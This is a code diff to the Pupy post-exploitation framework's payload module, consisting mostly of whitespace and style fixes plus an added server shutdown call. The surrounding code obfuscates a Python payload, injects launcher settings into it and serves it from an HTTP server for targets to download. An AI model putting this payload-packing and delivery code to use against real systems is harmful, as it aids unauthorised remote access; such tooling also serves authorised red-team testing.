@@ -3,7 +3,7 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
-from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
+from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
 import re
 import os.path
 
@@ -12,12 +12,13 @@ from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.payloads import dependencies
 from pupylib import ROOT
 
+
 def getLinuxImportedModules():
     '''
     '''
     lines = ""
-    with open(os.path.join(ROOT,"conf","imports_done.py")) as f:
-        lines=f.read()
+    with open(os.path.join(ROOT, "conf", "imports_done.py")) as f:
+        lines = f.read()
     return lines
 
 def pack_py_payload(display, conf, debug=False):
@@ -40,7 +41,7 @@ def pack_py_payload(display, conf, debug=False):
         ]) + '\n'
     )
 
-    with open(os.path.join(ROOT,'pp.py')) as f:
+    with open(os.path.join(ROOT, 'pp.py')) as f:
         code = f.read()
 
     code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
@@ -66,7 +67,7 @@ def serve_payload(display, payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"
     class PupyPayloadHTTPHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             self.send_response(200)
-            self.send_header('Content-type','text/html')
+            self.send_header('Content-type', 'text/html')
             self.end_headers()
             # Send the html message
             self.wfile.write(payload)
@@ -90,8 +91,9 @@ def serve_payload(display, payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"
 
         display(Success('Started http server on %s:%s '%(ip, port)))
         display(Success('Waiting for a connection ...'))
-
         server.serve_forever()
+
     except KeyboardInterrupt:
         display(Warn('KeyboardInterrupt received, shutting down the web server'))
         server.socket.close()
+        server.shutdown()
